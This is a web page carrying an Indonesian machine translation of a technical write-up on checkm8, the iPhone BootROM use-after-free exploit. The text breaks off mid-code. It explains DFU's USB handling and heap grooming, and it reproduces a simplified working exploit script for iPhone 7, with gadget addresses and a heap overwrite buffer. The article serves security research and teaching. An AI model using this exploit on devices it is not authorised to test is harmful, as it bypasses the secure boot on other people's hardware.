<!doctype html>
<html class="no-js" lang="en">

<head>
  <!-- Global site tag (gtag.js) - Google Analytics -->
  <script async src="https://www.googletagmanager.com/gtag/js?id=UA-134228602-6"></script>
  <script>
    window.dataLayer = window.dataLayer || [];
    function gtag(){dataLayer.push(arguments);}
    gtag('js', new Date());

    gtag('config', 'UA-134228602-6');
  </script>

  <meta charset="utf-8">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  <title>👨🏽‍🚒 👇 🍣 Analisis teknis eksploitasi checkm8 🎅🏾 🗑️ ♦️</title>
  <link rel="icon" type="image/x-icon" href="/favicon.ico" />
  <meta name="description" content="Kemungkinan besar Anda sudah pernah mendengar tentang exploit checkm8 yang terkenal, yang menggunakan kerentanan yang tidak dapat diperbaiki dalam Boo...">
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">

  <link rel="stylesheet" href="../../css/main.css">

  <link href="https://fonts.googleapis.com/css?family=Quicksand&display=swap" rel="stylesheet">

  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
  <script>window.jQuery || document.write('<script src="../../js/vendors/jquery-3.3.1.min.js"><\/script>')</script>

  <script>document.write('<script src="//pagea' + 'd2.googles' + 'yndication.com/pagea' + 'd/js/a' + 'dsby' + 'google.js"><\/script>')</script>
  <script>
        var superSpecialObject = {};
        superSpecialObject['google_a' + 'd_client'] = 'ca-p' + 'ub-6974184241884155';
        superSpecialObject['enable_page_level_a' + 'ds'] = true;
       (window['a' + 'dsbygoogle'] = window['a' + 'dsbygoogle'] || []).push(superSpecialObject);
  </script>
</head>

<body>
  <!--[if lte IE 9]>
    <p class="browserupgrade">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience and security.</p>
  <![endif]-->
  <header class="page-header js-page-header">
    <a class="page-header-logo-container" href="https://weekly-geekly-es.github.io/index.html"></a>
    <div class="page-header-text">Geekly articles weekly</div>
  </header>
  <section class="page js-page"><h1>Analisis teknis eksploitasi checkm8</h1><div class="post__body post__body_full"><div class="post__text post__text-html" id="post-content-body" data-io-article-url="https://habr.com/ru/company/dsec/blog/472762/"><div style="text-align:center;"><img width="500" src="https://habrastorage.org/webt/3l/k0/i2/3lk0i27tlko9sqankyec8rouqhw.png"></div><br><p> Kemungkinan besar Anda sudah pernah mendengar tentang exploit <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=id&amp;u=">checkm8</a> yang terkenal, yang menggunakan kerentanan yang tidak dapat diperbaiki dalam <code>BootROM</code> dari sebagian besar iDevices, termasuk <code>iPhone X</code>  Pada artikel ini, kami akan memberikan analisis teknis tentang eksploitasi ini dan mencari tahu apa yang menyebabkan kerentanan. </p><a name="habracut"></a><br><p>  Anda dapat membaca versi Rusia di <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=id&amp;u=">sini</a> . </p><br><h2 id="introduction">  Pendahuluan </h2><br><p>  Pertama, mari kita jelaskan secara singkat proses booting dari iDevice dan peran yang dimainkan oleh <code>BootROM</code> (alias <code>SecureROM</code> ).  Informasi terperinci tentang itu dapat ditemukan di <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=id&amp;u=">sini</a> .  Seperti apa bentuk booting: </p><br><p><img src="https://habrastorage.org/webt/kh/xi/tl/khxitlvaiov5lgx4kt45cq3qng4.png"></p><br><p>  Ketika perangkat dihidupkan, <code>BootROM</code> dijalankan terlebih dahulu.  Tugas utamanya adalah: </p><br><ul><li>  Inisialisasi platform (register platform yang diperlukan diinstal, <code>CPU</code> diinisialisasi, dll.) </li><li>  Verifikasi dan transfer kontrol ke tahap berikutnya <br><ul><li>  <code>BootROM</code> mendukung penguraian gambar <code>IMG3/IMG4</code> </li><li>  <code>BootROM</code> memiliki akses ke kunci <code>GID</code> untuk mendekripsi gambar </li><li>  untuk verifikasi gambar, <code>BootROM</code> memiliki kunci <code>Apple</code> publik <code>Apple</code> dan fungsi kriptografi yang diperlukan </li></ul></li><li>  Pulihkan perangkat jika booting lebih lanjut tidak dimungkinkan ( <code>Device Firmware Update</code> , <code>DFU</code> ). </li></ul><br><p>  <code>BootROM</code> memiliki ukuran yang sangat kecil dan dapat disebut versi ringan dari <code>iBoot</code> , karena mereka berbagi sebagian besar sistem dan kode pustaka.  Meskipun, tidak seperti <code>iBoot</code> , <code>BootROM</code> tidak dapat diperbarui.  Itu dimasukkan ke dalam memori read-only internal ketika perangkat diproduksi.  <code>BootROM</code> adalah akar perangkat keras kepercayaan dari rantai boot aman.  Kerentanan <code>BootROM</code> dapat memungkinkan penyerang mengontrol proses booting dan mengeksekusi kode yang tidak ditandatangani pada perangkat. </p><br><p><img src="https://habrastorage.org/webt/9a/pr/po/9aprpovk-0wg8fs7uya3axvs86s.png"></p><br><h2 id="the-history-of-checkm8">  Sejarah checkm8 </h2><br><p>  <code>checkm8</code> ditambahkan ke <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=id&amp;u=">ipwndfu</a> oleh penulisnya <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=id&amp;u=">axi0mX</a> pada 27 September 2019. Pada saat yang sama, ia <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=id&amp;u=">mengumumkan</a> pembaruan di Twitter dan memberikan deskripsi dan informasi tambahan tentang eksploit tersebut.  Menurut <code>iBoot</code> , ia menemukan kerentanan <code>use-after-free</code> dalam kode <code>USB</code> sementara menambal <code>iBoot</code> untuk <code>iOS 12 beta</code> pada musim panas 2018. <br>  <code>BootROM</code> dan <code>iBoot</code> membagikan sebagian besar kode mereka, termasuk <code>USB</code> , sehingga kerentanan ini juga relevan untuk <code>BootROM</code> . </p><br><p>  Sebagai berikut dari kode exploit, kerentanan dieksploitasi di <code>DFU</code> .  Ini adalah mode di mana seseorang dapat mentransfer gambar yang ditandatangani ke perangkat melalui <code>USB</code> yang akan di-boot nanti.  Misalnya, ini dapat berguna untuk memulihkan perangkat setelah pembaruan yang gagal. </p><br><p>  Pada hari yang sama, pengguna <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=id&amp;u=">littlelailo</a> mengatakan bahwa ia telah menemukan kerentanan itu pada bulan Maret dan menerbitkan deskripsi di <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=id&amp;u=">apollo.txt</a> .  Deskripsi berhubungan dengan <code>checkm8</code> , meskipun tidak semua detail dari exploit menjadi jelas setelah membacanya.  Inilah sebabnya kami memutuskan untuk menulis artikel ini dan menjelaskan semua detail eksploitasi hingga pelaksanaan payload di <code>BootROM</code> . </p><br><p>  Kami mendasarkan analisis kami tentang exploit pada sumber daya yang disebutkan di atas dan kode sumber <code>iBoot/SecureROM</code> , yang bocor pada Februari 2018. Kami juga menggunakan data yang kami dapatkan dari eksperimen yang dilakukan pada perangkat pengujian kami, <code>iPhone 7</code> ( <code>CPID:8010</code> )  Menggunakan, <code>checkm8</code> , kami mendapatkan kesedihan dari <code>SecureROM</code> dan <code>SecureRAM</code> , yang juga membantu untuk analisis. </p><br><h2 id="necessary-info-about-usb">  Info yang diperlukan tentang USB </h2><br><p>  Karena kerentanannya ada pada kode <code>USB</code> , perlu dipahami bagaimana antarmuka ini bekerja.  Spesifikasi lengkap dapat ditemukan di <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=id&amp;u=">https://www.usb.org/</a> , tetapi ini sudah lama dibaca.  Untuk keperluan kita, <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=id&amp;u=">USB dalam NutShell</a> lebih dari cukup.  Di sini, kami hanya akan menyebutkan poin yang paling relevan. </p><br><p>  Ada berbagai jenis transfer data <code>USB</code> .  Di <code>DFU</code> , hanya mode <code>Control Transfers</code> yang digunakan (baca lebih lanjut di <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=id&amp;u=">sini</a> ).  Dalam mode ini, setiap transaksi memiliki 3 tahap: </p><br><a name="setup_packet"></a><br><ul><li>  <code>Setup Stage</code> - paket <code>SETUP</code> dikirim;  memiliki bidang-bidang berikut: <br><ul><li>  <code>bmRequestType</code> - menentukan arah permintaan, jenisnya, dan penerima </li><li>  <code>bRequest</code> - mendefinisikan permintaan yang akan dibuat </li><li>  <code>wValue</code> , <code>wIndex</code> - ditafsirkan tergantung pada permintaan </li><li>  <code>wLength</code> - menentukan panjang data yang dikirim / diterima di <code>Data Stage</code> </li></ul></li><li>  <code>Data Stage</code> - tahap opsional transfer data.  Bergantung pada paket <code>SETUP</code> dikirim selama <code>Setup Stage</code> , data dapat dikirim dari host ke perangkat ( <code>OUT</code> ) atau sebaliknya ( <code>IN</code> ).  Data dikirim dalam porsi kecil (untuk <code>Apple DFU</code> , 0x40 byte). <br><ul><li>  Ketika sebuah host ingin mengirim bagian lain dari data, ia mengirimkan token <code>OUT</code> dan kemudian data itu sendiri. </li><li>  Ketika sebuah host siap untuk menerima data dari suatu perangkat, ia mengirimkan token <code>IN</code> ke perangkat. </li></ul></li><li>  <code>Status Stage</code> - tahap terakhir;  status seluruh transaksi dilaporkan. <br><ul><li>  Untuk permintaan <code>OUT</code> , tuan rumah mengirimkan token <code>IN</code> mana perangkat harus merespons dengan paket nol panjang. </li><li>  Untuk permintaan <code>IN</code> , host mengirim token <code>OUT</code> dan paket panjang nol. </li></ul></li></ul><br><p>  Skema di bawah ini menunjukkan permintaan <code>OUT</code> dan <code>IN</code> .  Kami mengeluarkan <code>ACK</code> , <code>NACK</code> , dan paket jabat tangan lainnya dengan sengaja, karena mereka tidak penting untuk eksploitasi itu sendiri. </p><br><p><img src="https://habrastorage.org/webt/lq/cm/-i/lqcm-itvvltjac1kkadebsszkkq.png"></p><br><h2 id="analysis-of-apollotxt">  Analisis apollo.txt </h2><br><p>  Kami memulai analisis dengan kerentanan dari <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=id&amp;u=">apollo.txt</a> .  Dokumen tersebut menjelaskan algoritma mode <code>DFU</code> : </p><br><blockquote>  <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=id&amp;u=">https://gist.github.com/littlelailo/42c6a11d31877f98531f6d30444f59c4</a> <br><ol><li>  Ketika usb mulai mendapatkan gambar lebih dari dfu, dfu mendaftarkan antarmuka untuk menangani semua perintah dan mengalokasikan buffer untuk input dan output </li><li>  jika Anda mengirim data ke dfu paket setup ditangani oleh kode utama yang kemudian memanggil kode antarmuka </li><li>  kode antarmuka memverifikasi bahwa wLength lebih pendek dari panjang buffer output input dan jika itu terjadi, pembaruan pointer dilewatkan sebagai argumen dengan pointer ke buffer output input </li><li>  lalu mengembalikan wLength yang merupakan panjang yang ingin diterima ke buffer </li><li>  kode utama usb kemudian memperbarui var global dengan panjang dan bersiap-siap untuk menerima paket data </li><li>  jika paket data diterima itu akan ditulis ke buffer output input melalui pointer yang disahkan sebagai argumen dan variabel global lainnya digunakan untuk melacak berapa banyak byte yang telah diterima </li><li>  jika semua data diterima, kode khusus dfu dipanggil lagi dan kemudian melanjutkan untuk menyalin isi buffer output input ke lokasi memori dari mana gambar tersebut kemudian di-boot </li><li>  setelah itu kode usb me-reset semua variabel dan melanjutkan untuk menangani paket-paket baru </li><li>  jika dfu keluar dari buffer output input dibebaskan dan jika parsing gambar gagal bootrom masukkan kembali dfu </li></ol><br></blockquote><p>  Pertama, kami memeriksa langkah-langkah ini terhadap kode sumber <code>iBoot</code> .  Kami tidak dapat menggunakan fragmen kode yang bocor di sini, jadi kami akan menggunakan pseudocode yang kami dapatkan dari rekayasa ulang <code>SecureROM</code> kami di <code>IDA</code> .  Anda dapat dengan mudah menemukan kode sumber <code>iBoot</code> dan menavigasi itu. </p><br><p>  Ketika <code>DFU</code> diinisialisasi, buffer <code>IO</code> dialokasikan, dan antarmuka <code>USB</code> untuk memproses permintaan ke <code>DFU</code> terdaftar: </p><br><p><img src="https://habrastorage.org/webt/2r/il/hz/2rilhzhao9dq9561t0nou161xos.png"></p><br><p>  Ketika paket <code>SETUP</code> dari permintaan ke <code>DFU</code> masuk, penangan antarmuka yang tepat dipanggil.  Untuk permintaan <code>OUT</code> (misalnya, ketika gambar dikirim), jika eksekusi berhasil, pawang harus mengembalikan alamat buffer <code>IO</code> untuk transaksi serta panjang data yang diharapkan akan diterima.  Kedua nilai disimpan dalam variabel global. </p><br><p><img src="https://habrastorage.org/webt/ha/d7/7i/had77ibmhmmxpmnfmuwqgop96ps.png"></p><br><p>  Tangkapan layar di bawah ini menunjukkan handler antarmuka <code>DFU</code> .  Jika permintaan benar, maka alamat buffer <code>IO</code> dialokasikan selama inisialisasi <code>DFU</code> dan panjang data yang diharapkan dari paket <code>SETUP</code> dikembalikan. </p><br><p><img src="https://habrastorage.org/webt/v1/ws/cp/v1wscp8-tw9pwanbkcjal_9zpv4.png"></p><br><p>  Selama <code>Data Stage</code> , setiap bagian data ditulis ke buffer <code>IO</code> , dan kemudian alamat buffer <code>IO</code> diimbangi dan penghitung yang diterima diperbarui.  Ketika semua data yang diharapkan diterima, penangan data antarmuka dipanggil dan keadaan global transaksi dihapus. </p><br><p><img src="https://habrastorage.org/webt/w7/-n/oo/w7-noo36ubqoc4wznkxjezxs_tu.png"></p><br><p>  Di penangan data <code>DFU</code> data yang diterima dipindahkan ke area memori dari mana ia akan dimuat nanti.  Berdasarkan kode sumber <code>iBoot</code> , area ini di perangkat <code>Apple</code> disebut <code>INSECURE_MEMORY</code> . </p><br><p><img src="https://habrastorage.org/webt/ep/sd/ro/epsdro1dycadjstreuvdpkejksa.png"></p><br><p>  Saat perangkat keluar dari mode <code>DFU</code> , buffer <code>IO</code> dialokasikan sebelumnya dibebaskan.  Jika gambar berhasil diperoleh dalam mode <code>DFU</code> , itu akan diverifikasi dan di-boot.  Jika ada kesalahan atau tidak mungkin untuk mem-boot gambar, <code>DFU</code> akan diinisialisasi lagi, dan seluruh proses akan diulang dari awal. </p><br><p>  Algoritma yang dijelaskan memiliki kerentanan <code>use-after-free</code> .  Jika kami mengirim paket <code>SETUP</code> pada saat mengunggah gambar dan menyelesaikan transaksi yang melewatkan <code>Data Stage</code> , keadaan global akan tetap diinisialisasi selama siklus <code>DFU</code> berikutnya, dan kami akan dapat menulis ke alamat penyangga <code>IO</code> dialokasikan selama sebelumnya iterasi <code>DFU</code> . </p><br><p>  Sekarang kita tahu cara kerja <code>use-after-free</code> berfungsi, pertanyaannya adalah, bagaimana kita bisa menimpa apa pun selama iterasi <code>DFU</code> ?  Sebelum inisialisasi <code>DFU</code> , semua sumber daya yang sebelumnya dialokasikan akan dibebaskan dan alokasi memori dalam iterasi baru harus persis sama.  Ternyata, ada kesalahan kebocoran memori yang menarik yang memungkinkan mengeksploitasi <code>use-after-free</code> . </p><br><h2 id="analysis-of-checkm8">  Analisis checkm8 </h2><br><p>  Mari kita <code>checkm8</code> sendiri.  Demi demonstrasi, kami akan menggunakan versi eksploit yang disederhanakan untuk <code>iPhone 7</code> , tempat kami mengeluarkan semua kode yang terkait dengan platform lain dan mengubah urutan dan jenis permintaan <code>USB</code> tanpa merusak fungsionalitasnya.  Kami juga menyingkirkan proses membangun muatan, yang dapat ditemukan di file asli, <code>checkm8.py</code> .  Sangat mudah untuk menemukan perbedaan antara versi untuk perangkat lain. </p><br><pre> <code class="python hljs"><span class="hljs-comment"><span class="hljs-comment">#!/usr/bin/env python from checkm8 import * def main(): print '*** checkm8 exploit by axi0mX ***' device = dfu.acquire_device(1800) start = time.time() print 'Found:', device.serial_number if 'PWND:[' in device.serial_number: print 'Device is already in pwned DFU Mode. Not executing exploit.' return payload, _ = exploit_config(device.serial_number) t8010_nop_gadget = 0x10000CC6C callback_chain = 0x1800B0800 t8010_overwrite = '\0' * 0x5c0 t8010_overwrite += struct.pack('&lt;32x2Q', t8010_nop_gadget, callback_chain) # heap feng-shui stall(device) leak(device) for i in range(6): no_leak(device) dfu.usb_reset(device) dfu.release_device(device) # set global state and restart usb device = dfu.acquire_device() device.serial_number libusb1_async_ctrl_transfer(device, 0x21, 1, 0, 0, 'A' * 0x800, 0.0001) libusb1_no_error_ctrl_transfer(device, 0x21, 4, 0, 0, 0, 0) dfu.release_device(device) time.sleep(0.5) # heap occupation device = dfu.acquire_device() device.serial_number stall(device) leak(device) leak(device) libusb1_no_error_ctrl_transfer(device, 0, 9, 0, 0, t8010_overwrite, 50) for i in range(0, len(payload), 0x800): libusb1_no_error_ctrl_transfer(device, 0x21, 1, 0, 0, payload[i:i+0x800], 50) dfu.usb_reset(device) dfu.release_device(device) device = dfu.acquire_device() if 'PWND:[checkm8]' not in device.serial_number: print 'ERROR: Exploit failed. Device did not enter pwned DFU Mode.' sys.exit(1) print 'Device is now in pwned DFU Mode.' print '(%0.2f seconds)' % (time.time() - start) dfu.release_device(device) if __name__ == '__main__': main()</span></span></code> </pre> <br><p>  Pengoperasian <code>checkm8</code> memiliki beberapa tahapan: </p><br><ol><li>  Heap feng-shui </li><li>  Alokasi dan pembebasan buffer <code>IO</code> tanpa membersihkan negara global </li><li>  Timpa <code>usb_device_io_request</code> di heap dengan <code>use-after-free</code> </li><li>  Menempatkan payload </li><li>  Eksekusi <code>callback-chain</code> </li><li>  Eksekusi <code>shellcode</code> </li></ol><br><p>  Mari kita lihat semua tahapan secara terperinci. </p><br><h2 id="1-heap-feng-shui">  1. Tumpukan feng-shui </h2><br><p>  Kami pikir ini adalah tahap yang paling menarik, jadi kami akan menghabiskan lebih banyak waktu untuk menggambarkannya. </p><br><pre> <code class="python hljs">stall(device) leak(device) <span class="hljs-keyword"><span class="hljs-keyword">for</span></span> i <span class="hljs-keyword"><span class="hljs-keyword">in</span></span> range(<span class="hljs-number"><span class="hljs-number">6</span></span>): no_leak(device) dfu.usb_reset(device) dfu.release_device(device)</code> </pre> <br><p>  Tahap ini diperlukan untuk mengatur tumpukan dengan cara yang bermanfaat untuk eksploitasi <code>use-after-free</code> .  Pertama, mari kita pertimbangkan <code>stall</code> panggilan, <code>leak</code> , <code>no_leak</code> : </p><br><pre> <code class="python hljs"><span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">def</span></span></span><span class="hljs-function"> </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">stall</span></span></span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">(device)</span></span></span><span class="hljs-function">:</span></span> libusb1_async_ctrl_transfer(device, <span class="hljs-number"><span class="hljs-number">0x80</span></span>, <span class="hljs-number"><span class="hljs-number">6</span></span>, <span class="hljs-number"><span class="hljs-number">0x304</span></span>, <span class="hljs-number"><span class="hljs-number">0x40A</span></span>, <span class="hljs-string"><span class="hljs-string">'A'</span></span> * <span class="hljs-number"><span class="hljs-number">0xC0</span></span>, <span class="hljs-number"><span class="hljs-number">0.00001</span></span>) <span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">def</span></span></span><span class="hljs-function"> </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">leak</span></span></span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">(device)</span></span></span><span class="hljs-function">:</span></span> libusb1_no_error_ctrl_transfer(device, <span class="hljs-number"><span class="hljs-number">0x80</span></span>, <span class="hljs-number"><span class="hljs-number">6</span></span>, <span class="hljs-number"><span class="hljs-number">0x304</span></span>, <span class="hljs-number"><span class="hljs-number">0x40A</span></span>, <span class="hljs-number"><span class="hljs-number">0xC0</span></span>, <span class="hljs-number"><span class="hljs-number">1</span></span>) <span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">def</span></span></span><span class="hljs-function"> </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">no_leak</span></span></span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">(device)</span></span></span><span class="hljs-function">:</span></span> libusb1_no_error_ctrl_transfer(device, <span class="hljs-number"><span class="hljs-number">0x80</span></span>, <span class="hljs-number"><span class="hljs-number">6</span></span>, <span class="hljs-number"><span class="hljs-number">0x304</span></span>, <span class="hljs-number"><span class="hljs-number">0x40A</span></span>, <span class="hljs-number"><span class="hljs-number">0xC1</span></span>, <span class="hljs-number"><span class="hljs-number">1</span></span>)</code> </pre> <br><p>  <code>libusb1_no_error_ctrl_transfer</code> adalah pembungkus untuk <code>device.ctrlTransfer</code> mengabaikan semua pengecualian yang timbul selama pelaksanaan permintaan.  <code>libusb1_async_ctrl_transfer</code> adalah pembungkus untuk fungsi <code>libusb_submit_transfer</code> dari <code>libusb</code> untuk eksekusi asinkron dari sebuah reqeust. </p><br><p>  Parameter berikut diteruskan ke panggilan ini: </p><br><ul><li>  Nomor perangkat </li><li>  Data untuk paket <code>SETUP</code> (di sini Anda dapat menemukan <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=id&amp;u=">deskripsi</a> ): <br><ul><li> <code>bmRequestType</code> </li> <li> <code>bRequest</code> </li> <li> <code>wValue</code> </li> <li> <code>wIndex</code> </li> </ul></li><li>  Panjang data ( <code>wLength</code> ) atau data untuk <code>Data Stage</code> </li><li>  Permintaan batas waktu </li></ul><br><p>  Argumen <code>bmRequestType</code> , <code>bRequest</code> , <code>wValue</code> , dan <code>wIndex</code> dibagi oleh ketiga jenis permintaan: </p><br><ul><li> <code>bmRequestType = 0x80</code> <br> <ul><li>  <code>0b1XXXXXXX</code> - arah <code>Data Stage</code> (Device to Host) </li><li>  <code>0bX00XXXXX</code> - tipe permintaan standar </li><li>  <code>0bXXX00000</code> - perangkat adalah penerima permintaan </li></ul></li><li>  <code>bRequest = 6</code> - permintaan untuk mendapatkan deskriptor ( <code>GET_DESCRIPTOR</code> ) </li><li> <code>wValue = 0x304</code> <br> <ul><li>  <code>wValueHigh = 0x3</code> - mendefinisikan jenis descriptor - string ( <code>USB_DT_STRING</code> ) </li><li>  <code>wValueLow = 0x4</code> - indeks deskriptor string, 4, sesuai dengan nomor seri perangkat (dalam hal ini, string adalah <code>CPID:8010 CPRV:11 CPFM:03 SCEP:01 BDID:0C ECID:001A40362045E526 IBFL:3C SRTG:[iBoot-2696.0.0.1.33]</code> ) </li></ul></li><li>  <code>wIndex = 0x40A</code> - indentifer bahasa string, yang nilainya tidak relevan dengan eksploitasi dan dapat diubah. </li></ul><br><p>  Untuk semua permintaan ini, 0x30 byte dialokasikan di heap untuk objek dari struktur berikut: </p><br><p><img src="https://habrastorage.org/webt/-e/ub/wb/-eubwbh-2fhsjb9bs36t0qom7be.png"></p><br><p>  Bidang yang paling menarik dari objek ini adalah <code>callback</code> dan <code>next</code> . </p><br><ul><li>  <code>callback</code> adalah penunjuk ke fungsi yang akan dipanggil ketika permintaan dilakukan. </li><li>  <code>next</code> adalah pointer ke objek berikutnya dari tipe yang sama;  perlu untuk mengatur antrian permintaan. </li></ul><br><p>  Fitur utama dari <code>stall</code> adalah penggunaan eksekusi permintaan yang tidak sinkron dengan batas waktu minimum.  Itu sebabnya, jika kita beruntung, permintaan akan dibatalkan pada level OS dan tetap dalam antrian eksekusi, dan transaksi tidak akan selesai.  Plus, perangkat akan terus menerima semua paket <code>SETUP</code> akan datang dan menempatkannya, bila perlu, dalam antrian eksekusi.  Kemudian, bereksperimen dengan pengontrol <code>USB</code> pada <code>Arduino</code> , kami menemukan bahwa untuk eksploitasi yang sukses, kami memerlukan host untuk mengirim paket <code>SETUP</code> dan token <code>IN</code> , setelah itu transaksi harus dibatalkan karena batas waktu.  Transaksi tidak lengkap ini terlihat seperti ini: </p><br><div style="text-align:center;"><img width="500" src="https://habrastorage.org/webt/sh/zq/ia/shzqiacghex3lk7jc9nhgoz3m7g.png"></div><br><p>  Selain itu, panjang permintaan hanya berbeda satu unit.  Untuk permintaan standar, ada <code>callback</code> standar yang terlihat seperti ini: </p><br><p><img src="https://habrastorage.org/webt/cx/as/gn/cxasgnrqyant31ostgflo85zxro.png"></p><br><p>  Nilai <code>io_length</code> sama dengan minimum dari <code>wLength</code> dalam paket <code>SETUP</code> permintaan dan panjang asli dari deskriptor yang diminta.  Karena deskriptor yang cukup panjang, kita dapat mengontrol nilai <code>io_length</code> dalam panjangnya.  Nilai <code>g_setup_request.wLength</code> sama dengan nilai <code>wLength</code> dari paket <code>SETUP</code> terakhir.  Dalam hal ini, ini <code>0xC1</code> . </p><br><p>  Dengan demikian, permintaan yang dibentuk oleh <code>stall</code> panggilan dan <code>leak</code> selesai, kondisi dalam fungsi terminal <code>callback</code> terpenuhi, dan <code>usb_core_send_zlp()</code> dipanggil.  Panggilan ini menciptakan paket <code>zero-length-packet</code> (paket <code>zero-length-packet</code> ) dan menambahkannya ke antrian eksekusi.  Ini diperlukan untuk penyelesaian transaksi yang benar dalam <code>Status Stage</code> . </p><br><p>  Permintaan selesai dengan memanggil fungsi <code>usb_core_complete_endpoint_io</code> .  Pertama, panggilan <code>callback</code> dan kemudian membebaskan memori permintaan.  Permintaan selesai tidak hanya ketika seluruh transaksi selesai, tetapi juga ketika <code>USB</code> diatur ulang.  Ketika sinyal untuk mereset <code>USB</code> diterima, semua permintaan dalam antrian eksekusi akan selesai. </p><br><p>  Dengan secara selektif memanggil <code>usb_core_send_zlp()</code> ketika melewati antrian eksekusi dan membebaskan permintaan sesudahnya, kita dapat memperoleh kontrol yang cukup atas tumpukan untuk eksploitasi <code>use-after-free</code> .  Pertama, mari kita lihat loop pembersihan permintaan: </p><br><p><img src="https://habrastorage.org/webt/ik/tn/ym/iktnymzi4lywmtf1xsmcfsgpyb4.png"></p><br><p>  Seperti yang Anda lihat, antrian dikosongkan, dan kemudian permintaan yang dibatalkan dijalankan dan diselesaikan oleh <code>usb_core_complete_endpoint_io</code> .  Permintaan yang dialokasikan oleh <code>usb_core_send_zlp</code> ditempatkan ke <code>ep-&gt;io_head</code> .  Setelah <code>USB</code> reset selesai, semua informasi tentang titik akhir akan jelas, termasuk pointer <code>io_head</code> dan <code>io_tail</code> , dan permintaan panjang nol akan tetap ada di heap.  Jadi, kita bisa membuat bongkahan kecil di tengah tumpukan.  Skema di bawah ini menunjukkan cara melakukannya: </p><br><p><img src="https://habrastorage.org/webt/jl/rj/v5/jlrjv55cw23fehubgo7hsqmv68w.png"></p><br><p>  Di tumpukan <code>SecureROM</code> , area memori baru dialokasikan dari potongan bebas terkecil yang tepat.  Dengan membuat potongan bebas kecil menggunakan metode yang dijelaskan di atas, kita dapat mengontrol alokasi memori selama inisialisasi <code>USB</code> , termasuk alokasi <code>io_buffer</code> dan permintaan. </p><br><p>  Untuk memiliki pemahaman yang lebih baik tentang ini, mari kita lihat permintaan mana ke heap dibuat ketika <code>DFU</code> diinisialisasi.  Selama analisis kode sumber <code>iBoot</code> dan rekayasa ulang <code>SecureROM</code> , kami mendapatkan urutan berikut: </p><br><ul><li><ol><li>  Alokasi berbagai deskriptor string <br><ul><li>  1.1.  <code>Nonce</code> (ukuran <code>234</code> ) </li><li>  1.2.  <code>Manufacturer</code> ( <code>22</code> ) </li><li>  1.3.  <code>Product</code> ( <code>62</code> ) </li><li>  1.4.  <code>Serial Number</code> ( <code>198</code> ) </li><li>  1.5.  <code>Configuration string</code> ( <code>62</code> ) </li></ul></li></ol><br></li><li><ol><li>  Alokasi terkait dengan pembuatan tugas pengontrol <code>USB</code> <br><ul><li>  2.1.  Struktur <code>0x3c0</code> ( <code>0x3c0</code> ) </li><li>  2.2.  Tumpukan <code>0x1000</code> ( <code>0x1000</code> ) </li></ul></li></ol><br></li><li><ol><li>  <code>io_buffer</code> ( <code>0x800</code> ) </li></ol><br></li><li><ol><li>  Deskriptor konfigurasi <br><ul><li>  4.1.  <code>High-Speed</code> ( <code>25</code> ) </li><li>  4.2.  <code>Full-Speed</code> ( <code>25</code> ) </li></ul></li></ol><br></li></ul><br><p>  Kemudian, struktur permintaan dialokasikan.  Jika ada potongan kecil di heap, beberapa alokasi dari kategori pertama akan pergi ke sana, dan semua alokasi lainnya akan pindah.  Dengan demikian, kita dapat melimpah <code>usb_device_io_request</code> dengan merujuk ke buffer yang lama.  Ini terlihat seperti ini: </p><br><p><img src="https://habrastorage.org/webt/on/dl/dy/ondldygtgie2sho2l8xh8q5mlva.png"></p><br><p>  Untuk menghitung offset yang diperlukan, kami cukup meniru semua alokasi yang tercantum di atas dan mengadaptasi sedikit kode sumber <code>iBoot</code> . </p><br><div class="spoiler">  <b class="spoiler_title">Meniru permintaan ke heap di DFU</b> <div class="spoiler_text"><pre> <code class="cpp hljs"><span class="hljs-meta"><span class="hljs-meta">#</span><span class="hljs-meta-keyword"><span class="hljs-meta"><span class="hljs-meta-keyword">include</span></span></span><span class="hljs-meta"> </span><span class="hljs-meta-string"><span class="hljs-meta"><span class="hljs-meta-string">"heap.h"</span></span></span><span class="hljs-meta"> #</span><span class="hljs-meta-keyword"><span class="hljs-meta"><span class="hljs-meta-keyword">include</span></span></span><span class="hljs-meta"> 